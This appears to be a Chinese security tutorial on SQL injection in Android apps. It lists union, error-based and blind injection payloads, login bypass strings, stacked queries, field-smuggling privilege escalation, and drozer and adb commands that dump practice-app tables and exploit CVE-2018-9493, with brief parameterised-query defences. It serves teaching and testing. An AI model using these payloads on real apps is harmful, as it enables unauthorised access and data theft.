#  Android APP漏洞之战——SQL注入漏洞初探   
随风而行aa  看雪学苑   2022-08-03 17:58  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjCKLF01CwuiaEE2MKA4lWX1ibibqSibSwxKib5DicpkPC2ZvcEibs04QmOvfLw/640?wx_fmt=jpeg "")  
  
本文为看雪论坛优秀文章  
  
看雪论坛作者ID：随风而行aa  
  
  
```
```  
  
  
本文主要讲述Android中存在的常见的SQL注入漏洞的方式，以及如何快速的挖掘SQL注入漏洞。  
  
   
  
本文结构如下：  
  
   
  
第二节讲述SQL注入的基本原理  
  
   
  
第三节讲述常见的SQL注入漏洞并复现  
  
   
  
第四节讲述Content Provider上的sql注入漏洞  
  
   
  
第五节讲述DownProvider 上的sql注入漏洞  
  
##   
```
```  
##   
## 1.SQL注入原理  
  
通过实施 SQL 注入，攻击者可以获得对应用程序或数据库的完全访问权限，从而可以不负责任地删除或更改重要数据。未正确验证用户输入的应用程序使它们容易受到 SQL 注入的攻击。SQL 注入攻击 (SQLIA) 发生在攻击者能够通过操纵用户输入数据将一系列恶意 SQL 语句插入“查询”以供后端数据库执行时。使用这种类型的威胁，应用程序可以很容易地被黑客入侵并被攻击者窃取机密数据。  
  
   
  
SQL攻击的原理图如下所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xrAJHz61r90AAybfhwztQz8oKQxukMVlSCDqP1LAibeFTibLjsTENOAXA/640?wx_fmt=png "")  
  
上图中攻击者将 SQL 语句添加到应用程序表单输入框中，以访问资源或更改存储在数据库中的数据。应用程序中缺少输入验证会导致攻击者成功。在 SQL 注入攻击中，攻击者通过应用程序注入字符串输入，从而改变或操纵 SQL 语句以使攻击者受益。  
  
### 2.SQL注入分类  
  
要学习SQL注入在Android上的使用，首先需要了解SQL注入的种类，SQL注入一般分为两种情况：有回显和无回显，有回显是指SQL语句返回的内容有显示在页面中；无回显是页面输出的内容并不是SQL语句返回的内容，而是“真”和“假”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xRaG6h6l2CfgiaqaJSdAdPqdKwEfDvZibsT5X21VF7gznSU44lr0Glnzg/640?wx_fmt=png "")  
#### （1）联合查询注入  
  
联合查询注入是在原有的查询条件下，通过union拼接上select语句，union可以用于合并两个和多个select语句的结果集  
  
   
  
当union之前的select语句结果集为空时，查询结果将由union后的select语句控制。  
  
   
  
联合查询语句构造步骤：  
  
1.order by判断原有查询语句的列数  
  
2.使原有查询语句的结果为空  
  
3.判断数据输出位置  
  
4.使用union语句拼接目标数据的查询语句  
  
  
对于页面有回显，通常使用联合查询注入，可以快速爆出数据。  
  
   
  
示例：  
```
order by //确定列数

union select 1,2,3 //显示回显位

union select 1,database(),user() //通过回显位爆出内容

union select 1,2,group_concat(schema_name) from information_schema.schemata //爆库

union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() //爆表

union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema=database() //爆列

union select 1,2,group_concat(列名) from 表名 //爆值
```  
  
#### （2）报错注入  
  
报错注入经过构造的函数，让函数处理user()等不合规定的数据，引发mysql报错；几乎任何与数据库有关的操作经过sql拼接都可以产生报错注入；当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容。  
  
   
  
构造报错注入的语句：  
  
1.构造目标数据查询语句  
  
2.选择报错注入函数  
  
3.构造报错注入语句  
  
4.拼接报错注入语句  
  
常见的报错注入函数：floor()、extractvalue()、updatexml()等  
  
  
报错注入一般使用在查询不回显数据，但会打印错误信息的页面中：  
```
extractvalue(1,concat(0x7e,(select user()),0x7e)) //extractvalue报错将输出的字符长度限制为32位

updatexml(1,concat(0x7e,(select database()),0x7e),1) //updatexml报错将输出的字符长度限制为32位

select count(\*) from information_schema.tables GROUP BY concat((select database()),floor(rand(0)\*2)) //floor报错将输出字符长度限制为64个字符
```  
  
#### （3）布尔盲注  
  
布尔盲注以页面回显内容的不同作为判定依据，通过构造语句返回页面的“真”和“假”来判断数据库信息的正确性。  
  
   
  
布尔盲注提取数据的基本步骤：  
  
1.构造目标数据查询语句  
  
2.选择拼接方式  
  
3.构造判断表达式  
  
4.提取数据长度  
  
5.提取数据内容  
  
常见的拼接方式：原始条件真 and 判断条件真，原始条件假 or 判断条件真等  
  
  
若网页设置了无报错信息返回，在不回显数据+不返回报错信息的情况下，只剩下盲注方法可用，而布尔盲注使用在对真/假条件的返回内容很容易区分的页面中。  
  
   
  
示例：  
```
length(database()) //判断数据库名长度

ascii(substr((database()),s,1))=可用ASCII码值 //从数据库库名第s位开始，截取一位，进行逐一猜解；数据库库、表、字段所有名称的可用字符范围为A-Z、a-z、0-9和下划线，也就是ASCII码值从48到122

length((select table_name from information_schema.tables where table_schema=database() limit 3,1)) //判断数据库中的第4个表表名长度，第1个表从0开始

ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),s,1))=可用ASCII码值 //逐一猜解第4个表的表名

//之后逐一猜解列名与数据
```  
  
#### （4）时间盲注  
  
时间盲注通过构造语句，通过页面响应的时长来判断信息；时间盲注的关键点在于if()函数，通过条件语句进行判断，为真则立即执行，否则延时执行，通常使用sleep()等专用的延时函数来进行延时操作。  
  
   
  
时间盲注与布尔盲注的语句构造过程相似，通常在布尔盲注表达式的基础上使用if函数加入延时语句来构造。通常情况下，盲注需要逐个字符进行判断，极大增加了时间成本，而对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。  
  
   
  
在布尔盲注永假条件所返回的内容与正常语句返回的内容很接近或相同，无法判断的情况下，可使用时间盲注。  
  
   
  
示例：  
```
sleep() //使用延时函数进行判断

if(length(database())=数字,sleep(2),0) //if()函数判断数据库长度，if(Condition,A,B)，当Condition为true时返回A，当Condition为false时返回B

if(ascii(substr(database(),s,1))=可用ASCII码值,sleep(2),0) //使用if函数，从第S位开始截取一位，逐一猜解数据库名，可用ASCII码值范围为48-122

if(length(select table_name from information_schema.tables where table_schema=database() limit 3,1)=数字,sleep(2),0) //逐一猜解数据库第4个表长度，第1个表从0开始

if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),s,1))=可用ASCII码值,sleep(2),0) //逐一猜解数据库第4个表表名

//逐一猜解列名、数据
```  
  
  
SQL注入的常见分类如上所述，由于本文主要针对Android上SQL注入讲解，这里就不再深入研究，这里引用博客：SQL注入漏洞分析（https://www.modb.pro/db/163732），要深入了解朋友可以看原作者博客，里面还有一些案例讲解。  
  
### 3.SQL常见注入技巧  
  
前面我们已经了解了SQL注入的基本分类，下面我们介绍一些SQL注入实际的测试技巧：  
#### （1）重言式攻击  
  
重言式攻击通过一个或多个条件SQL语句查询注入代码，使SQL命令计算为真条件，如(1=1)或（--）。一般可以用来绕过身份验证  
  
   
  
例如：  
```

Select * from table where table_ID = '1' or '1=1'--'AND table_password='1234';
```  
  
#### （2）Piggy-backed查询  
  
Piggy-backed Queries是一种攻击，它使用查询分隔符（如“；”）向原始查询注入额外的查询语句，从而危及数据库。在这种方法中，第一个查询是原始的，而随后的查询是注入的。这次攻击是非常危险的  
  
   
  
例如：  
```
SELECT pass FROM userTable WHEREuser_ld='user1" AND Password = 0; drop userTable
```  
  
#### （3）逻辑错误  
  
逻辑错误攻击利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。  
```
SELECT*FROM userTable WHEREuser_ld=’1111’ AND password='1234’ AND CONVERT(char, no)
```  
####   
#### （4）联合查询  
  
联合查询注入称为语句注入攻击。在此攻击中，攻击者在原始SQL语句中插入附加语句。此攻击可以通过在Vulnerable参数中插入UNION查询或“；<SQL Statement>”形式的语句来完成。  
```
SELECT* FROM userTable WHEREuser_ld=1111'UNION SELECT *FROMmemberTable WHERE member_ld='admin'--' AND password='1234';
```  
  
#### （5）存储过程  
  
在该技术中，攻击者主要关注数据库系统中存在的存储过程。存储过程直接由数据库引擎运行。它是一段可利用的代码。存储过程为授权或未经授权的客户端提供true或false值。对于SQLIA，攻击者将写入“；关机；--“使用登录名或密钥。  
```
SELECT Username FROM UserTableWHEREuser_name= "user1" AND pass=" "; SHUTDOWN;
```  
  
#### （6）推断攻击  
  
利用推断攻击，攻击者可以改变数据库或应用程序的行为。这种类型的攻击可以分为两种著名的技术，它们是：盲注入和定时攻击  
##### <1>盲注入  
  
当程序员忘记隐藏导致数据库应用程序不安全的错误消息时，就会发生这种类型的SQLIA，这种错误消息通过SQL语句询问一系列逻辑问题来帮助SQLIA危及数据库。  
```
SELECT pass FROM userTable WHERE username='user' and 1 =0 -- AND pass = AND pin= 0
SELECT info FROM userTable WHERE username='user' and = 1 -- AND pass = AND pass= 0
```  
  
##### <2>定时攻击  
  
这种类型的攻击允许攻击者通过观察数据库响应中的定时延迟来从数据库中收集信息。这类攻击利用if条件语句来达到延时的目的。WAITFOR是分支上的关键字，它导致数据库将其响应延迟指定的时间。  
```
declare @ varchar (8000) select @s =db_name (if (ascii (substring (@s,1,1))&(power (2,o) > o waitfor delay '0:0:5"
```  
  
#### （7）交替编码  
  
当攻击者通过使用替代编码（如十六进制、ASCII和Unicode）修改注入查询时，就会发生此类攻击。通过这种方式，攻击者可以逃离开发人员的过滤器，该过滤器扫描输入查询以查找特定的已知“坏字符”。  
```
SELECT accounts FROM userTable WHERE login="AND pin=0; exec (char(0x73687574646f776e)
```  
  
### 4.Andorid APP SQL漏洞常见的测试点  
  
Android APP SQL注入漏洞一般位于APP的用户登录，充值页面，修改银行卡，提交留言反馈，商品购买，提现功能等地方。  
  
  
```
```  
  
这里我们使用一个漏洞样本来详细的讲解APP SQL注入漏洞的情况。  
### 1.重言式攻击  
#### （1）漏洞原理  
  
我们前面讲了，可以使用(1=1)或（--）来绕过身份验证，我们知道一般SQL语句登录构造如下：  
```
Select * From 用户表 Where UserName=xxx and Password=xxx
```  
  
  
然后判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功，而这样的语句的话。  
  
   
  
那么我们可以在登录账户或密码后面加上（1=1），因为1=1登录条件永远成立，而--作为内嵌评论的开始字符，会导致后面内容只作为评论，这样就可以不去验证密码的有效性。  
  
#### （2）漏洞复现  
  
我们打开应用：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xxiaYfIYEAdO9sFibIHjHSIlHBRsuN7DfD8AoGFuoEibOX8ibQABdWTZDQQ/640?wx_fmt=png "")  
  
这里很显然是一个登录界面，APP会通过用户输入的账号和密码，去查询数据库中用户进行匹配，我们进一步进行静态分析。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xkz03tkX4yx8Opxcp6icU1ZjBPhV6SzNKYuWHDBIGRrPRDvMSbg55l4g/640?wx_fmt=png "")  
  
  
不难找到这句语句是APP进行数据库查询的语句，我们可以进行进一步分析：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08x28SSVIEPbdibRDnf2pOVHBDfZEiaciaKlcPEOuGjiaw54duYMGMTZIp98Q/640?wx_fmt=png "")  
  
  
不难发现这里我们如果在不知道密码情况下，随意输入，APP会根据账号和密码构造一个有效的负载来避免检测。  
```
" WHERE NAME='" + username + "' AND PASSWORD='" + password + "'"
```  
  
  
因此我们可以使用（1=1）和--两种方式来进行sql注入绕过验证：  
  
****  
**--**  
  
我们使用--来构造语句，无非是使得不会去检测密码的有效性，所以我们可以构造语句。  
```
SELECT * FROM employee WHERE NAME='Admin' -- AND PASSWORD = 'xyz'
```  
  
  
这样会是的我们将查询语句构造成上面语句，APP就不会去验证密码，而我们又输入的是管理员账号，所以可以尝试进行sql注入绕过。  
  
   
  
构造账号和密钥：账号Admin' -- 密钥：Anything  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08x2Gc95DpU0gLjMnoUuf0QiaRE1FxYJKJFDsUBISZictB3KK4WECTTla6g/640?wx_fmt=png "")  
  
这样就成功的绕过了验证，获得具体信息。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xQakr8H5nv8AYGuV9hry56bniaKqMia6heNlxQlt75IrMFib7awuT7XdBA/640?wx_fmt=png "")  
  
我们还可以查询账号密钥相应的详细：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xrZZPw8w1C6ZIuvibwfcic5R6NNyxicQqW0Kxr0dvn0e1InrywZJLIKpxg/640?wx_fmt=png "")  
  
  
同理我们使用（1=1）方式来进行注入。  
  
   
  
**1=1**  
  
我们使用1=1来进行注入，无非是相在输入账户情况下，可以输入任意的密码，这样我们只需要使用(OR '1'='1')即可。  
  
   
  
可以构造SQL语句：  
```
SELECT * FROM employee WHERE NAME='Admin' OR '1'='1' AND PASSWORD = 'anything' OR '1'='1'
```  
  
  
构造账号和密钥：账号：Admin' OR '1'='1 密钥：anything' OR '1'='1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xFXVMjldlBXIcHPsPM24WnKyMSJUoGMHIVmdtp5K1Z26VvlUNz4Libsg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xJYVjUSfOylqVTY9bFMiam3NbjzH0Zt63J6aSpg92a8HO3umsVVfUrVg/640?wx_fmt=png "")  
  
  
同理成功进入 上面账号和密码可以为任意值。  
  
### 2.Piggy-backed查询  
#### （1）漏洞原理  
  
我们上面已经简单的绕过了该攻击，我们可以使用;来进行Piggy-backed查询，这样可以使得在登录系统的同时，再进行执行一条SQL语句  
####   
#### （2）漏洞复现  
  
我们可以构造SQL语句：  
```
SELECT * FROM employee WHERE NAME='anyname' OR '1'='1';INSERT INTO employee (NAME, ID) VALUES ('MUR','11451') -- AND PASSWORD = 'anything'
```  
  
  
上面的语句实现三个功能：构造任意的用户名，插入新的sql语句，使得验证码无效。  
  
   
  
构造用户名和密码：用户名：anyname' OR '1'='1'; INSERT INTO employee (NAME, ID) VALUES ('MUR','11451') -- 密码：anything。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08x4kjwAkq4K4v7qqVO9rALrU5eBVmYicIKPJ6QZVBDajW9oxIMicwdJujw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xFQjZujv4ZEt9O6QkylkfiaJVBjmA4osHLqfNx74OopJB4TicNPF2x0GA/640?wx_fmt=png "")  
  
  
这里我们发现成功的登录，但是并没有插入用户名成功，经过分析，在大多数SQLiteDatabase API)中;被定义为终止，所以它之后的任何内容都应该被忽略，但是这也是在一些APP中可以进行测试的环节，当我们理解;作用后，很明显我们又可以得到一种绕过登录的方法，这里既然;后面都无效，是不是意味，我们只要输入正确账户，就可以登录。  
  
   
  
构造SQL语句：  
```
SELECT * FROM employee WHERE NAME='Admin';  AND PASSWORD = 'anything'
```  
  
  
构造账号和密码：账号Admin';，密码：Anything。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xagALicq3qN225U43YDVLFyPu02Deda0Egsic7f2UUhuSu0oE6aXJGMbw/640?wx_fmt=png "")  
  
  
同样成功登录：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xPjzBjAAYzKaicAmOicuIvyRTdoHAN05vKuzFmZicze8tslbhCElmtYYtQ/640?wx_fmt=png "")  
###   
### 3.逻辑错误攻击  
#### （1）漏洞原理  
  
原本逻辑错误攻击是利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。而我们这里发现在数据字段校验时，通过插入多余的字段，来实现越权的功能。  
  
#### （2）漏洞复现  
  
这里我们分析到数据库更新的语句。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbCTbsaHakvS0fb48RL08xaDO7SnyibaCiaOxkAPkywWHCv50ibiblJuryPCCANKibzicjUySuxqyUXibXw/640?wx_fmt=png "")  
  
  
通过这里的更新语句我们可以很明显的得到构造的SQL。  
```

UPDATE employee SET NICKNAME=..., EMAIL =..., ADDRESS=..., PASSWORD =..,               PHONE='...' WHERE ID = (...)
```  
  
  
这里我们模拟一般的管理系统，很显然只能管理员对员工的一些信息进行修改，比如薪资，而员工只能修改一般的字段，我们这里通过普通用户模式登陆。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjvPCMMdWpibaoYdYYTREicvRIFAdvD0XgdsticQvwPoRHZCJ31VfLjgl9g/640?wx_fmt=png "")  
  
  
可以很明显发现，这里的薪资是无法进行修改的，那我们通过添加字段利用逻辑错误来实现修改。  
  
   
  
构造SQL:  
```
UPDATE employee SET NICKNAME=..., EMAIL =..., ADDRESS=..., PASSWORD =..,               PHONE='21389', SALARY='100000000'
WHERE ID = (Alice.id)
```  
  
  
我们这里修改Phone的字段：  
```
21389', SALARY='100000000
```  
  
  
这样就多加了一个字段，但是我们对上面代码逻辑进行分析，发现只是对字符串进行读取，并未校验。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjuqORGYFD6ajQaFPbwNn3YOeTibJa5ricPVGwaOSRJTuaYXMRtWUXUgdw/640?wx_fmt=png "")  
  
  
点击更新：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjYHQGwibZaAn1cFgB8XYsqh04sB26W6vlGYPDDsFMf0Sbx01euNwmEPQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjUIVcu5z8HrcOGIwrQBpxF9zXomONIQ1VEQdx2QIvtYNsYmbdxyXhvQ/640?wx_fmt=png "")  
  
再次进入我们就发现薪资变为了我们预设的数字。  
  
   
  
当然利用上面的实现我们还能修改用户名，比如：  
```
UPDATE employee SET NICKNAME=..., EMAIL =..., ADDRESS=..., PASSWORD =..,               PHONE='21389', SALARY=100000000
WHERE NAME = 'Boby' -- ' WHERE ID = (Alice.id)
```  
  
  
我  
们构造语句：  
```
21389', SALARY=10000000 WHERE NAME='Bobby' --
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyj7x6UxLJFx2lUZjCWicTAN690XFo3fGJKD9MwBPoCJhnc0Ycatq363EA/640?wx_fmt=png "")  
  
  
更新成功后，我们进入Bobby的信息，发现就被修改了。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjfBsgpiaMoFPuQlXundvOPJGyicQ5PYics1kiahVibjy5xiahZUfTmHSZgevQ/640?wx_fmt=png "")  
###   
### 4.漏洞的挖掘思路  
  
我们前面讲了三种常见类型的SQL注入的案例，但是我们在实际挖掘过程中，怎么初步的判断是否存在这类漏洞，并进行使用。  
  
   
  
我们打开另外一个样本APK：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyj8S5xPcD79ZC5THFCkjcoCbDVfGpMrtwMv1HRlfGEBISUOJicK7ZC6tw/640?wx_fmt=png "")  
  
我们知道并不是所有APK样本，我们都能很轻易的获得源码，有些可能使用了加壳服务，但是测试上述的漏洞很容易。  
  
   
  
我们都知道SQL注入需要单引号配对，我们可以根据日志和错误提示来查看。  
  
   
  
首先我们先进行日志监听或使用ddms  
```
  adb logcat |grep packagename
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjt5aH3ONwwjcwZosAH3Oiagpc29jeDO7Jkp8viaTFXOWHtiapysxk2wfOg/640?wx_fmt=png "")  
  
  
然后我们输入一个单引号'  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjIhDJ24IB0icqoMkszAm3E7GevB4cQWJ8ct4GyMFZe6icgiceGEcDvxmfQ/640?wx_fmt=png "")  
  
很明显说明这里是存在SQL注入，说明程序是有从Sqlite中获取信息，但由于我们输入'引号，没有配对，导致程序错误。  
  
   
  
然后我们再输入双引号''  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyj9TrrM9dmkTeaXHKwPGLL1zoVeBYBicu8UHB39frrWaCriaws2Y9DQYMw/640?wx_fmt=png "")  
  
程序正在搜索输入的数据，没有产生SQL错误。为了进一步确认，我们再加一个单引号，看看是否会引发SQL错误。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjNyYFuQs8qjciaUOoLJ41T1qayThnnlSsD2MswibgJU56WBibicgujmzZmw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyj6WHbwgmWyhWLLT2t2Mzn9TREmL3RvvBs5KefCMhb06NaPfE8mdYydg/640?wx_fmt=png "")  
  
程序再次报错，说明奇数个'会导致SQL错误，当引号刚好匹配时SQL查询正好会执行。  
  
   
  
然后我们就可以使用我们上面的漏洞来进行测试，我们使用一个万能语句，即无论正确错误都输入的语句。  
```
  1' or '1' !='2
```  
  
  
无论是ture还是flase我们都满足，即万能语句。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjJX0U4ghaP9RANjWiceGuKabS25aibVnvcxWicx60CHnIrEtNMsMQiaaeEA/640?wx_fmt=png "")  
  
   
这里我们就成功的爆出了相关信息。  
  
   
  
这里很显然是app接收了用户的输入，没有经过验证就直接加入到SQL查询语句。  
###   
### 5.安全防护  
  
针对1-3的漏洞现象，样本中依次进行了安全防护。  
  
   
  
针对1-2的防护：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjNeWQ0EL8ALLEndKzt6rEcMMoLykibGh1ibqbpa5eBEVGZ4x9EiaibVmmRA/640?wx_fmt=png "")  
  
上图中2表示防护的代码。  
  
   
  
针对3的防护：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjrZIFkP6xDV0YpumDTPqUBT0xJnC82scsxltuEapSgAMDXfP5j3UQvQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyj4Tb2lf3Ef04ZpicUA4gPscB8p3cqItTBJwZvtN20ZusqPZ5AVmDoo5Q/640?wx_fmt=png "")  
  
我们可以发现上传的防护方式，都使用了?, 问号?是 SQL 查询中的参数持有者，将使用 String ListArray 中给出的相应参数进行编译，即会对输入的参数进行转义和绑定，这样就可以有效的进行参数输入防护。  
  
  
```
```  
  
## 我在Android APP漏洞之战（4）——Content漏洞详解（https://bbs.pediy.com/thread-269447.htm）已经初步介绍了Content Provider中存在的sql注入漏洞，我们知道Android中provider提供不同进程之间共享内容，而content在查询的过程中也会存在一些典型的Sql注入漏洞。  
  
### 1.漏洞原理  
  
Content Provider SQL注入漏洞产生的原因如下：  
```
Content Provider组件是可导出的未校验输入值是否符舍规范，就作为SQL语句的一部分，例如：
String inputUserName = "123'or'1=1";
String inputPassword = "123";
String sql = "select *from user where username='"+inputUserName +"' and password='"+inputPassword+"'";
Cursor cursor = db.rawQuery(sql);
以上两点均满足的情况下，就会产生SQL注入风险
```  
  
### 2.漏洞检测  
  
我们挖掘Content Provider漏洞的步骤：  
  
（1）扫描全局代码，是否存在导出的Content Provider组件  
  
（2）若存在导出的Content Provider组件，则判断SQL语句中是否有未校验的输入值，若存在则存在风险。  
  
（3）汇总结果  
###   
### 3.漏洞复现  
  
我们使用drozer扫描注入的位置：  
```
run scanner.provider.injection -a <包名>
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjFo3Wiau9Zk1f3wbdNjiaTUwN2smhZpBVk6X6xK1GY3F13MWVNvg0KLrQ/640?wx_fmt=png "")  
  
  
然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据  
```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " * from Key;--+"
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjKfRhWcD6MSz4LfeN2iaic4yhYbRLnjbr45iaia63Ia4p7X7TXV7DkFMr6w/640?wx_fmt=png "")  
  
  
列出所有表信息：  
```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjkODesWdb8Cic04wiaSSHlNLgWuwWTrQWxGsSzfegC7SpVW2AC8SZJKVw/640?wx_fmt=png "")  
  
  
获取具体表信息  
```
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjXHpJRKqmUEREsYTkWt2EfpnicX6gMOkkVfoGVSoGeUku7U6cQTGdkNA/640?wx_fmt=png "")  
  
列出该app的表信息  
```
run scanner.provider.sqltables -a  com.mwr.example.sieve
```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjHgQmEqLguSeN2GuGwp49Wz26liaXicOdYiaianMv9hQ3PK5icGYPoaqGJbw/640?wx_fmt=png "")  
###   
### 4.安全防护  
  
（1）不需要导出的Content Provider组件，建议显示设置组件的“android:exported”属性为false  
  
   
  
（2）当组件可导出时，建议使用selectionArgs进行参数化组成SQL语句，例如：  
```
String inputUserName = "xxxx";
String inputPassword = "xxxx";
String sql = "select *from user where username=? and password=?";
Cursor cursor = db.rawQuery(sql,new String[]{username,password});
```  
  
  
  
我们可以发现Content Provider上的sql漏洞核心原理和上面是一样的。  
##   
  
##   
```
```  
##   
  
A  
ndroid Download Provider是用来进行下载的一个重要组件，Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。  
  
   
  
下载的流程关系图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjjV9Q8RD1icesLIu6DXLImXyuQTC2CX4dBbwNwjMf3qd5y9r7WIw1Uiag/640?wx_fmt=png "")  
###   
### 1.CVE-2018-9493: Download Provider SQL注入  
#### （1）漏洞原理  
  
通过利用SQL注入漏洞，未授予任何权限的恶意应用程序可以绕过当前实现的所有访问控制机制，从下载提供程序检索所有条目。此外，被授予有限权限的应用程序（如Internet）也可以从不同的URI访问所有数据库内容。对于Gmail、Chrome或Google Play Store等应用程序，从该提供程序检索的信息可能包括潜在的敏感信息，如文件名、描述、标题、路径、URL（在查询字符串中可能包含敏感参数）等。  
  
   
  
然而内部数据库中的某些列（例如CookieData）被认为是私有的，不能通过 Download Content Provider 直接访问，除非调用者具有不受限制的权限（URI 受signatureOrSystem访问级别保护）  
  
   
  
利用 where 表达式中的 SQL 注入，绕过setStrict过滤器，将允许我们从内部数据库中提取内容，包括任何受限制的列下载  
  
   
  
访问下载内容提供程序需要不同的权限，例如Internet或access_all_downloads，这取决于所请求的URI  
  
   
  
例如：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjSStbeRSvB0t9YfDRq4g2au0IBDJHazicrRxKAMj89cClZ54d5LlNPwQ/640?wx_fmt=png "")  
  
但是可以针对下面URL，则无需任何权限：  
```
  content://downloads/public_downloads/#
```  
  
  
我们可以在源码中查看对该URI的定义：  
```
sURIMatcher.addURI("downloads",
   Downloads.Impl.PUBLICLY_ACCESSIBLE_DOWNLOADS_URI_SEGMENT + "/#",
   PUBLIC_DOWNLOAD_ID);
```  
  
  
可以看出该URI，可以用于公共下载，但没有什么可以阻止攻击者注入SQL Selection子句来访问数据库中的任何行、列或表，包括受保护的列。这样我们就可以进行SQL注入。  
  
   
  
总结：  
```
不需要权限：
content://downloads/public_downloads/#
需要权限android.permission.INTERNET：
content://downloads/my_downloads/
content://downloads/my_downloads/#
content://downloads/download/
content://downloads/download/#
```  
  
  
因此我们可以构造相关的sql注入语句：  
```
  adb shell content query --uri content://downloads/public_downloads/0 -- where "1=1) OR (1=1"
```  
  
  
